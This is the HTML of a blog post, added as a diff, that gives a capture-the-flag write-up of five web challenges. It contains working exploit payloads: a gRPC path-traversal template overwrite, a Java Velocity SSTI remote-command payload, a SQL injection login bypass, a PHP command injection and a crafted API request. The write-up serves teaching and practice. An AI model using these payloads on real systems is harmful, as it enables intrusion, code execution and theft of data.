@@ -1,0 +1,623 @@
+<!doctype html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html
+  class="not-ready lg:text-base"
+  style="--bg: #fbfbfb"
+  lang="en"
+>
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1, shrink-to-fit=no"
+  />
+
+  
+  <title>Cyber Apocalypse CTF 2024 Writeup: Web - Berlian Gabriel</title>
+
+  
+  <meta name="theme-color" />
+
+  
+  
+  
+  
+  <meta name="description" content="Testimonial This vulnerable part of the code in grpc.go will allow us to perform arbitrary file write. From there we can overwrite the index.templ to include exec() command, and the output will be displayed in the testimonial box.
+err := os.WriteFile(fmt.Sprintf(&#34;public/testimonials/%s&#34;, req.Customer), []byte(req.Testimonial), 0644) We need the following python libaray to interact directly with the gRPC server:
+pip install grpcio grpcio-tools Inside the folder that has the .proto file, which in this case is \challenge\pb\pytypes." />
+  <meta name="author" content="Berlian Gabriel" />
+  
+
+  
+  
+  
+  
+  
+  
+  <link rel="preload stylesheet" as="style" href="https://berliangabriel.github.io/main.min.css" />
+
+  
+  
+  
+  
+  
+  <link rel="preload" as="image" href="https://berliangabriel.github.io/theme.png" />
+
+  
+  
+  
+  
+  
+
+  
+  
+  <link rel="preload" as="image" href="https://berliangabriel.github.io/twitter.svg" />
+  
+  <link rel="preload" as="image" href="https://berliangabriel.github.io/linkedin.svg" />
+  
+  
+
+  
+  
+  <script
+    defer
+    src="https://berliangabriel.github.io/highlight.min.js"
+    onload="hljs.initHighlightingOnLoad();"
+  ></script>
+  
+
+  
+  
+  
+
+  
+  <link rel="icon" href="https://berliangabriel.github.io/favicon.ico" />
+  <link rel="apple-touch-icon" href="https://berliangabriel.github.io/apple-touch-icon.png" />
+
+  
+  <meta name="generator" content="Hugo 0.92.2" />
+
+  
+  
+  
+  
+  
+  <meta itemprop="name" content="Cyber Apocalypse CTF 2024 Writeup: Web">
+<meta itemprop="description" content="Testimonial This vulnerable part of the code in grpc.go will allow us to perform arbitrary file write. From there we can overwrite the index.templ to include exec() command, and the output will be displayed in the testimonial box.
+err := os.WriteFile(fmt.Sprintf(&#34;public/testimonials/%s&#34;, req.Customer), []byte(req.Testimonial), 0644) We need the following python libaray to interact directly with the gRPC server:
+pip install grpcio grpcio-tools Inside the folder that has the .proto file, which in this case is \challenge\pb\pytypes."><meta itemprop="datePublished" content="2024-03-14T20:05:02+08:00" />
+<meta itemprop="dateModified" content="2024-03-14T20:05:02+08:00" />
+<meta itemprop="wordCount" content="1010">
+<meta itemprop="keywords" content="" />
+  
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Cyber Apocalypse CTF 2024 Writeup: Web"/>
+<meta name="twitter:description" content="Testimonial This vulnerable part of the code in grpc.go will allow us to perform arbitrary file write. From there we can overwrite the index.templ to include exec() command, and the output will be displayed in the testimonial box.
+err := os.WriteFile(fmt.Sprintf(&#34;public/testimonials/%s&#34;, req.Customer), []byte(req.Testimonial), 0644) We need the following python libaray to interact directly with the gRPC server:
+pip install grpcio grpcio-tools Inside the folder that has the .proto file, which in this case is \challenge\pb\pytypes."/>
+
+  
+  
+  
+  <link rel="canonical" href="https://berliangabriel.github.io/post/cyber-apocalypse-ctf-2024/" />
+  
+  
+</head>
+
+  <body class="text-black duration-200 ease-out dark:text-white">
+    <header class="mx-auto flex h-[4.5rem] max-w-3xl px-8 lg:justify-center">
+  <div class="relative z-50 mr-auto flex items-center">
+    <a
+      class="-translate-x-[1px] -translate-y-[1px] text-2xl font-semibold"
+      href="https://berliangabriel.github.io"
+      >Berlian Gabriel</a
+    >
+    <div
+      class="btn-dark text-[0] ml-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]"
+      role="button"
+      aria-label="Dark"
+    ></div>
+  </div>
+
+  <div
+    class="btn-menu relative z-50 -mr-8 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
+    role="button"
+    aria-label="Menu"
+  ></div>
+
+  
+  <script>
+    
+    const htmlClass = document.documentElement.classList;
+    setTimeout(() => {
+      htmlClass.remove('not-ready');
+    }, 10);
+
+    
+    const btnMenu = document.querySelector('.btn-menu');
+    btnMenu.addEventListener('click', () => {
+      htmlClass.toggle('open');
+    });
+
+    
+    const metaTheme = document.querySelector('meta[name="theme-color"]');
+    const lightBg = '#fbfbfb'.replace(/"/g, '');
+    const setDark = (isDark) => {
+      metaTheme.setAttribute('content', isDark ? '#000' : lightBg);
+      htmlClass[isDark ? 'add' : 'remove']('dark');
+      localStorage.setItem('dark', isDark);
+    };
+
+    
+    const darkScheme = window.matchMedia('(prefers-color-scheme: dark)');
+    if (htmlClass.contains('dark')) {
+      setDark(true);
+    } else {
+      const darkVal = localStorage.getItem('dark');
+      setDark(darkVal ? darkVal === 'true' : darkScheme.matches);
+    }
+
+    
+    darkScheme.addEventListener('change', (event) => {
+      setDark(event.matches);
+    });
+
+    
+    const btnDark = document.querySelector('.btn-dark');
+    btnDark.addEventListener('click', () => {
+      setDark(localStorage.getItem('dark') !== 'true');
+    });
+  </script>
+
+  <div
+    class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full select-none flex-col justify-center pb-16 duration-200 dark:bg-black lg:static lg:h-auto lg:flex-row lg:!bg-transparent lg:pb-0 lg:transition-none"
+  >
+    
+    
+    <nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-6">
+      
+      <a
+        class="block text-center text-2xl leading-[5rem] lg:text-base lg:font-normal"
+        href="/about/"
+        >About</a
+      >
+      
+      <a
+        class="block text-center text-2xl leading-[5rem] lg:text-base lg:font-normal"
+        href="/contact/"
+        >Contact</a
+      >
+      
+    </nav>
+    
+
+    
+    <nav
+      class="mt-12 flex justify-center space-x-10 dark:invert lg:ml-12 lg:mt-0 lg:items-center lg:space-x-6"
+    >
+      
+      <a
+        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
+        style="--url: url(./twitter.svg)"
+        href="https://twitter.com/BerlianGM"
+        target="_blank"
+        rel="me"
+      >
+        twitter
+      </a>
+      
+      <a
+        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
+        style="--url: url(./linkedin.svg)"
+        href="https://linkedin.com/in/Berlian-Gabriel-Mongkoginta"
+        target="_blank"
+        rel="me"
+      >
+        linkedin
+      </a>
+      
+    </nav>
+    
+  </div>
+</header>
+
+
+    <main
+      class="prose prose-neutral relative mx-auto min-h-[calc(100%-9rem)] max-w-3xl px-8 pb-16 pt-12 dark:prose-invert"
+    >
+      
+
+<article>
+  <header class="mb-16">
+    <h1 class="!my-0 pb-2.5">Cyber Apocalypse CTF 2024 Writeup: Web</h1>
+
+    
+    <div class="text-sm antialiased opacity-60">
+      
+      <time>Mar 14, 2024</time>
+      
+      
+      
+      
+    </div>
+    
+  </header>
+
+  <section><h1 id="testimonial">Testimonial</h1>
+<p>This vulnerable part of the code in grpc.go will allow us to perform arbitrary file write. From there we can overwrite the index.templ to include exec() command, and the output will be displayed in the testimonial box.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">WriteFile</span>(<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;public/testimonials/%s&#34;</span>, <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">Customer</span>), []byte(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">Testimonial</span>), <span style="color:#ae81ff">0644</span>)
+</code></pre></div><p>We need the following python libaray to interact directly with the gRPC server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pip install grpcio grpcio-tools
+</code></pre></div><p>Inside the folder that has the .proto file, which in this case is <code>\challenge\pb\pytypes.proto</code> you can generate the Python gRPC code as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python -m grpc_tools.protoc -I. --python_out<span style="color:#f92672">=</span>. --grpc_python_out<span style="color:#f92672">=</span>. ptypes.proto
+</code></pre></div><p>We can list the directory / to know the flag filename, and then later we modify the ls command to cat the flag, using the solver below.
+<strong>solver.py</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> grpc
+<span style="color:#f92672">import</span> ptypes_pb2
+<span style="color:#f92672">import</span> ptypes_pb2_grpc
+
+newTemplate <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">package home
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">import (
+</span><span style="color:#e6db74">	&#34;htbchal/view/layout&#34;
+</span><span style="color:#e6db74">	&#34;io/fs&#34;	
+</span><span style="color:#e6db74">	&#34;fmt&#34;
+</span><span style="color:#e6db74">	&#34;os&#34;
+</span><span style="color:#e6db74">    &#34;os/exec&#34;
+</span><span style="color:#e6db74">)
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">templ Index() {
+</span><span style="color:#e6db74">	@layout.App(true) {
+</span><span style="color:#e6db74">&lt;nav class=&#34;navbar navbar-expand-lg navbar-dark bg-black&#34;&gt;
+</span><span style="color:#e6db74">  &lt;div class=&#34;container-fluid&#34;&gt;
+</span><span style="color:#e6db74">    &lt;a class=&#34;navbar-brand&#34; href=&#34;/&#34;&gt;The Fray&lt;/a&gt;
+</span><span style="color:#e6db74">    &lt;button class=&#34;navbar-toggler&#34; type=&#34;button&#34; data-toggle=&#34;collapse&#34; data-target=&#34;#navbarNav&#34;
+</span><span style="color:#e6db74">            aria-controls=&#34;navbarNav&#34; aria-expanded=&#34;false&#34; aria-label=&#34;Toggle navigation&#34;&gt;
+</span><span style="color:#e6db74">        &lt;span class=&#34;navbar-toggler-icon&#34;&gt;&lt;/span&gt;
+</span><span style="color:#e6db74">    &lt;/button&gt;
+</span><span style="color:#e6db74">    &lt;div class=&#34;collapse navbar-collapse&#34; id=&#34;navbarNav&#34;&gt;
+</span><span style="color:#e6db74">        &lt;ul class=&#34;navbar-nav ml-auto&#34;&gt;
+</span><span style="color:#e6db74">            &lt;li class=&#34;nav-item active&#34;&gt;
+</span><span style="color:#e6db74">                &lt;a class=&#34;nav-link&#34; href=&#34;/&#34;&gt;Home&lt;/a&gt;
+</span><span style="color:#e6db74">            &lt;/li&gt;
+</span><span style="color:#e6db74">            &lt;li class=&#34;nav-item&#34;&gt;
+</span><span style="color:#e6db74">                &lt;a class=&#34;nav-link&#34; href=&#34;javascript:void();&#34;&gt;Factions&lt;/a&gt;
+</span><span style="color:#e6db74">            &lt;/li&gt;
+</span><span style="color:#e6db74">            &lt;li class=&#34;nav-item&#34;&gt;
+</span><span style="color:#e6db74">                &lt;a class=&#34;nav-link&#34; href=&#34;javascript:void();&#34;&gt;Trials&lt;/a&gt;
+</span><span style="color:#e6db74">            &lt;/li&gt;
+</span><span style="color:#e6db74">            &lt;li class=&#34;nav-item&#34;&gt;
+</span><span style="color:#e6db74">                &lt;a class=&#34;nav-link&#34; href=&#34;javascript:void();&#34;&gt;Contact&lt;/a&gt;
+</span><span style="color:#e6db74">            &lt;/li&gt;
+</span><span style="color:#e6db74">        &lt;/ul&gt;
+</span><span style="color:#e6db74">    &lt;/div&gt;
+</span><span style="color:#e6db74">  &lt;/div&gt;
+</span><span style="color:#e6db74">&lt;/nav&gt;
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">&lt;div class=&#34;container&#34;&gt;
+</span><span style="color:#e6db74">  &lt;section class=&#34;jumbotron text-center&#34;&gt;
+</span><span style="color:#e6db74">      &lt;div class=&#34;container mt-5&#34;&gt;
+</span><span style="color:#e6db74">          &lt;h1 class=&#34;display-4&#34;&gt;Welcome to The Fray #HACKED&lt;/h1&gt;
+</span><span style="color:#e6db74">          &lt;p class=&#34;lead&#34;&gt;Assemble your faction and prove you&#39;re the last one standing!&lt;/p&gt;
+</span><span style="color:#e6db74">          &lt;a href=&#34;javascript:void();&#34; class=&#34;btn btn-primary btn-lg&#34;&gt;Get Started&lt;/a&gt;
+</span><span style="color:#e6db74">      &lt;/div&gt;
+</span><span style="color:#e6db74">  &lt;/section&gt;
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">  &lt;section class=&#34;container mt-5&#34;&gt;
+</span><span style="color:#e6db74">      &lt;h2 class=&#34;text-center mb-4&#34;&gt;What Others Say&lt;/h2&gt;
+</span><span style="color:#e6db74">      &lt;div class=&#34;row&#34;&gt;
+</span><span style="color:#e6db74">          @Testimonials()
+</span><span style="color:#e6db74">      &lt;/div&gt;
+</span><span style="color:#e6db74">  &lt;/section&gt;
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">  &lt;div class=&#34;row mt-5 mb-5&#34;&gt;
+</span><span style="color:#e6db74">    &lt;div class=&#34;col-md&#34;&gt;
+</span><span style="color:#e6db74">      &lt;h2 class=&#34;text-center mb-4&#34;&gt;Submit Your Testimonial&lt;/h2&gt;
+</span><span style="color:#e6db74">      &lt;form method=&#34;get&#34; action=&#34;/&#34;&gt;
+</span><span style="color:#e6db74">        &lt;div class=&#34;form-group&#34;&gt;
+</span><span style="color:#e6db74">          &lt;label class=&#34;mt-2&#34; for=&#34;testimonialText&#34;&gt;Your Testimonial&lt;/label&gt;
+</span><span style="color:#e6db74">          &lt;textarea class=&#34;form-control mt-2&#34; id=&#34;testimonialText&#34; rows=&#34;3&#34; name=&#34;testimonial&#34;&gt;&lt;/textarea&gt;
+</span><span style="color:#e6db74">        &lt;/div&gt;
+</span><span style="color:#e6db74">        &lt;div class=&#34;form-group&#34;&gt;
+</span><span style="color:#e6db74">          &lt;label class=&#34;mt-2&#34; for=&#34;testifierName&#34;&gt;Your Name&lt;/label&gt;
+</span><span style="color:#e6db74">          &lt;input type=&#34;text&#34; class=&#34;form-control mt-2&#34; id=&#34;testifierName&#34; name=&#34;customer&#34;/&gt;
+</span><span style="color:#e6db74">        &lt;/div&gt;
+</span><span style="color:#e6db74">        &lt;button type=&#34;submit&#34; class=&#34;btn btn-primary mt-4&#34;&gt;Submit Testimonial&lt;/button&gt;
+</span><span style="color:#e6db74">      &lt;/form&gt;
+</span><span style="color:#e6db74">    &lt;/div&gt;
+</span><span style="color:#e6db74">  &lt;/div&gt;
+</span><span style="color:#e6db74">&lt;/div&gt;
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">&lt;footer class=&#34;bg-black text-white text-center py-3&#34;&gt;
+</span><span style="color:#e6db74">    &lt;p&gt;&amp;copy; 2024 The Fray. All Rights Reserved.&lt;/p&gt;
+</span><span style="color:#e6db74">&lt;/footer&gt;
+</span><span style="color:#e6db74">	}
+</span><span style="color:#e6db74">}
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">func GetTestimonials() []string {
+</span><span style="color:#e6db74">	fsys := os.DirFS(&#34;public/testimonials&#34;)	
+</span><span style="color:#e6db74">	files, err := fs.ReadDir(fsys, &#34;.&#34;)		
+</span><span style="color:#e6db74">	if err != nil {
+</span><span style="color:#e6db74">		return []string{fmt.Sprintf(&#34;Error reading testimonials: %v&#34;, err)}
+</span><span style="color:#e6db74">	}
+</span><span style="color:#e6db74">	var res []string
+</span><span style="color:#e6db74">	for _, file := range files {
+</span><span style="color:#e6db74">		fileContent, _ := fs.ReadFile(fsys, file.Name())
+</span><span style="color:#e6db74">		res = append(res, string(fileContent))		
+</span><span style="color:#e6db74">	}
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">	output, _ := exec.Command(&#34;ls&#34;, &#34;/&#34;).Output()
+</span><span style="color:#e6db74">	res = append(res, string(output))
+</span><span style="color:#e6db74">	return res
+</span><span style="color:#e6db74">}
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">templ Testimonials() {
+</span><span style="color:#e6db74">  for _, item := range GetTestimonials() {
+</span><span style="color:#e6db74">    &lt;div class=&#34;col-md-4&#34;&gt;
+</span><span style="color:#e6db74">        &lt;div class=&#34;card mb-4&#34;&gt;
+</span><span style="color:#e6db74">            &lt;div class=&#34;card-body&#34;&gt;
+</span><span style="color:#e6db74">                &lt;p class=&#34;card-text&#34;&gt;&#34;</span><span style="color:#e6db74">{item}</span><span style="color:#e6db74">&#34;&lt;/p&gt;
+</span><span style="color:#e6db74">                &lt;p class=&#34;text-muted&#34;&gt;- Anonymous Testifier&lt;/p&gt;
+</span><span style="color:#e6db74">            &lt;/div&gt;
+</span><span style="color:#e6db74">        &lt;/div&gt;
+</span><span style="color:#e6db74">    &lt;/div&gt;
+</span><span style="color:#e6db74">  }
+</span><span style="color:#e6db74">}
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>():
+    <span style="color:#75715e"># Assuming the server is running on the specified IP and port</span>
+    <span style="color:#66d9ef">with</span> grpc<span style="color:#f92672">.</span>insecure_channel(<span style="color:#e6db74">&#39;83.136.249.237:30739&#39;</span>) <span style="color:#66d9ef">as</span> channel:
+        stub <span style="color:#f92672">=</span> ptypes_pb2_grpc<span style="color:#f92672">.</span>RickyServiceStub(channel)
+        response <span style="color:#f92672">=</span> stub<span style="color:#f92672">.</span>SubmitTestimonial(ptypes_pb2<span style="color:#f92672">.</span>TestimonialSubmission(customer<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;../../view/home/index.templ&#34;</span>, testimonial<span style="color:#f92672">=</span>newTemplate))
+        print(<span style="color:#e6db74">&#34;Client received: &#34;</span> <span style="color:#f92672">+</span> response<span style="color:#f92672">.</span>message)
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+    run()
+</code></pre></div><p><img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/Cyber-Apocalypse-CTF-2024/web1.png?raw=true" alt=""></p>
+<p>We can the proceed, to edit the payload earlier, from <code>(&quot;ls&quot;, &quot;/&quot;)</code> to <code>(&quot;cat&quot;, &quot;/flagd410c24b47.txt&quot;)</code>, and rerun the solver.</p>
+<p><em><strong>FLAG: <code>HTB{w34kly_t35t3d_t3mplate5}</code></strong></em>
+<br/>
+<br/>
+<br/></p>
+<h1 id="labyrinth-linguist">Labyrinth Linguist</h1>
+<p>This vulnerable part of the code will allow us to replace the <code>TEXT</code> on the template file index.html, which can be used to perform SSTI injection on Java Velocity.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">bufferedReader <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BufferedReader<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> FileReader<span style="color:#f92672">(</span>filePath<span style="color:#f92672">));</span>
+String line<span style="color:#f92672">;</span>
+            
+<span style="color:#66d9ef">while</span> <span style="color:#f92672">((</span>line <span style="color:#f92672">=</span> bufferedReader<span style="color:#f92672">.</span><span style="color:#a6e22e">readLine</span><span style="color:#f92672">())</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+    line <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span><span style="color:#a6e22e">replace</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;TEXT&#34;</span><span style="color:#f92672">,</span> replacement<span style="color:#f92672">);</span>
+    content<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span>line<span style="color:#f92672">);</span>
+    content<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">);</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><p>However, we need to slightly modify the payload from the widely available (from HackTricks) payload for Java Velocity</p>
+<p>payload for <code>text</code></p>
+<pre tabindex="0"><code>#set($e=&quot;e&quot;)
+#set($ex=$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;ls /&quot;));
+$ex.waitFor();
+#set($out=$ex.getInputStream());
+#foreach($i in [1..$out.available()])
+$out.read()
+#end
+</code></pre><p>Using the payload above, we can list the directory / to know the flag filename, and then later we modify the ls command to cat the flag.</p>
+<p><img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/Cyber-Apocalypse-CTF-2024/web2.png?raw=true" alt="">
+Converting the output which seems like ASCII values we obtain the following text.</p>
+<pre tabindex="0"><code>app
+bin
+boot
+dev
+entrypoint.sh
+etc
+flagbec3440fd0.txt
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+</code></pre><p>We can the proceed, to edit the payload earlier, from <code>ls /</code> to <code>cat flagbec3440fd0.txt</code>, and redo the ASCII values conversion from the output.</p>
+<p><em><strong>FLAG: <code>HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!}</code></strong></em>
+<br/>
+<br/>
+<br/></p>
+<h1 id="korp-terminal">KORP Terminal</h1>
+<p>We need to use SQL injection on the username field to inject our own hash in which we know the plaintext. We need to make the overall SQL query to become like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> password <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">#</span>this will <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">none</span>
+<span style="color:#66d9ef">UNION</span>
+<span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#34;$2y$10$fTohgxZzGpJddulpVNYT.uzESMK98yNWWaEOA56yuXmAQUCoXe2fS&#34;</span><span style="color:#75715e">-- &#39; #this will return a hash that we can control
+</span></code></pre></div><p>Clue from Challenge Description: <code>The terminal login screen is protected by state-of-the-art encryption and security protocols.</code>
+bcrypt is commonly used for login, so we can try hashing using bcrypt. If the hash type chosen is incorrect, the server should return <code>invalid salt</code>.</p>
+<p>Crafting bcrypt hash using password plaintext: <code>fidethus</code>
+<img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/Cyber-Apocalypse-CTF-2024/web3.png?raw=true" alt=""></p>
+<p><strong>payload</strong></p>
+<pre tabindex="0"><code>username=' UNION SELECT &quot;$2y$10$fTohgxZzGpJddulpVNYT.uzESMK98yNWWaEOA56yuXmAQUCoXe2fS&quot;-- &amp;password=fidethus
+</code></pre><p><em><strong>FLAG: <code>HTB{t3rm1n4l_cr4ck1ng_sh3n4nig4n5}</code></strong></em>
+<br/>
+<br/>
+<br/></p>
+<h1 id="timekorp">TimeKORP</h1>
+<p>Vulnerable part of the source code, concatenating user input directly to <code>exec()</code> without sanitization
+PHP Command Injection:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">TimeModel</span>
+{
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($format)
+    {
+        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">command</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;date &#39;+&#34;</span> <span style="color:#f92672">.</span> $format <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&#39; 2&gt;&amp;1&#34;</span>;
+    }
+
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getTime</span>()
+    {
+        $time <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">command</span>);
+        $res  <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($time) <span style="color:#f92672">?</span> $time <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;?&#39;</span>;
+        <span style="color:#66d9ef">return</span> $res;
+    }
+}
+</code></pre></div><p><code>?format=';dir'</code>
+<img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/Cyber-Apocalypse-CTF-2024/web4.png?raw=true" alt=""></p>
+<p><code>?format=';cat ../flag</code>
+<img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/Cyber-Apocalypse-CTF-2024/web5.png?raw=true" alt=""></p>
+<p><em><strong>FLAG: <code>HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3}</code></strong></em>
+<br/>
+<br/>
+<br/></p>
+<h1 id="flag-command">Flag Command</h1>
+<p>Bypass the flow of the game by directly inputting the command with <code>secret</code>, which can be seen from the response body from <code>GET /api/options</code>. Think of it like a cheat code in a video game!</p>
+<p><strong>Response to GET /api/options</strong></p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Server: Werkzeug/3.0.1 Python/3.11.8
+Date: Sun, 10 Mar 2024 05:33:48 GMT
+Content-Type: application/json
+Content-Length: 637
+Connection: close
+
+{
+  &quot;allPossibleCommands&quot;: {
+    &quot;1&quot;: [
+      &quot;HEAD NORTH&quot;,
+      &quot;HEAD WEST&quot;,
+      &quot;HEAD EAST&quot;,
+      &quot;HEAD SOUTH&quot;
+    ],
+    &quot;2&quot;: [
+      &quot;GO DEEPER INTO THE FOREST&quot;,
+      &quot;FOLLOW A MYSTERIOUS PATH&quot;,
+      &quot;CLIMB A TREE&quot;,
+      &quot;TURN BACK&quot;
+    ],
+    &quot;3&quot;: [
+      &quot;EXPLORE A CAVE&quot;,
+      &quot;CROSS A RICKETY BRIDGE&quot;,
+      &quot;FOLLOW A GLOWING BUTTERFLY&quot;,
+      &quot;SET UP CAMP&quot;
+    ],
+    &quot;4&quot;: [
+      &quot;ENTER A MAGICAL PORTAL&quot;,
+      &quot;SWIM ACROSS A MYSTERIOUS LAKE&quot;,
+      &quot;FOLLOW A SINGING SQUIRREL&quot;,
+      &quot;BUILD A RAFT AND SAIL DOWNSTREAM&quot;
+    ],
+    &quot;secret&quot;: [
+      &quot;Blip-blop, in a pickle with a hiccup! Shmiggity-shmack&quot;
+    ]
+  }
+}
+
+</code></pre><p>Pay attention to this part:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JSON" data-lang="JSON">    <span style="color:#e6db74">&#34;secret&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> [
+      <span style="color:#e6db74">&#34;Blip-blop, in a pickle with a hiccup! Shmiggity-shmack&#34;</span>
+    ]
+</code></pre></div><p>Crafted POST Request to get flag.</p>
+<pre tabindex="0"><code>POST /api/monitor HTTP/1.1
+Host: 94.237.62.48:39111
+Content-Length: 68
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://94.237.62.48:39111
+Referer: http://94.237.62.48:39111/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+{&quot;command&quot;:&quot;Blip-blop, in a pickle with a hiccup! Shmiggity-shmack&quot;}
+</code></pre><p><em><strong>FLAG: `HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!}</strong></em></p>
+</section>
+
+  
+  
+
+  
+  
+  
+  
+  <nav class="mt-24 flex rounded-lg bg-black/[3%] text-lg dark:bg-white/[8%]">
+    
+    
+    <a
+      class="ml-auto flex w-1/2 items-center justify-end rounded-r-md p-6 pl-3 font-semibold no-underline hover:bg-black/[2%] dark:hover:bg-white/[3%]"
+      href="https://berliangabriel.github.io/post/shakti-ctf-2024-foren/"
+      ><span>shakti CTF 2024 Writeup for Forensic and OSINT Challenges</span><span class="ml-1.5">→</span></a
+    >
+    
+  </nav>
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</article>
+
+
+    </main>
+
+    <footer
+  class="opaco mx-auto flex h-[4.5rem] max-w-3xl items-center px-8 text-[0.9em] opacity-60"
+>
+  <div class="mr-auto">
+    &copy; 2024
+    <a class="link" href="https://berliangabriel.github.io">Berlian Gabriel</a>
+  </div>
+  <a class="link mx-6" href="https://gohugo.io/" rel="noopener" target="_blank"
+    >Powered by Hugo️️</a
+  >️
+  <a
+    class="link"
+    href="https://github.com/nanxiaobei/hugo-paper"
+    rel="noopener"
+    target="_blank"
+    >✎ Paper</a
+  >
+</footer>
+
+  </body>
+</html>
